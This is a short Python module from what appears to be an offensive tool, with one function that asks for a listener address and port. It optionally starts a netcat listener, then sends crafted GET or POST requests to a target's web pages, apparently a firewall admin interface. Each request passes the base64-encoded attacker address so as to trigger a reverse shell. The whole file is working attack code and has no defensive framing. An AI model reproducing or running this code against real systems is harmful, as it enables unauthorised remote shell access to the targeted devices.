import utils
import os
import base64

import NoSense
def Popper(details, level):
        ip = input("LHOST:\n-> ")
        port = input("LPORT PORT:\n-> ")
        schoice = input("Want a NC listener? (1) Yes (2) No\n-> ")
        if(schoice == "1"): os.popen("qterminal -e nc -lvnp %s" % (port))
        if(level == "1"):
            path = "/RevShell.php?ip=" + ip + "&port=" + port
            utils.simpleGET(details, path, "", 3)
        if(level == "2"):
            address = (ip + " " + port).encode("ascii")
            add_encoded = base64.b64encode(address).decode("ascii")
            path = "/interfaces_ipv6.php?host="
            utils.simpleGET(details, path, add_encoded, 3)
        if(level == "3"):
            address = (ip + " " + port).encode("ascii")
            add_encoded = base64.b64encode(address).decode("ascii")
            path = "/system_advanced_routes.php"
            pro_data= {"route": add_encoded}
            utils.simplePOST(details, path, "", 1, pro_data)
        if(level == "4"):
            address = (ip + " " + port).encode("ascii")
            add_encoded = base64.b64encode(address).decode("ascii")
            utils.simpleGET(details, "/", "", 0)
            leet_data = {"__csrf_magic": details.csrf, "loggedin": add_encoded}
            utils.simplePOST(details, "/", "", 1, leet_data)
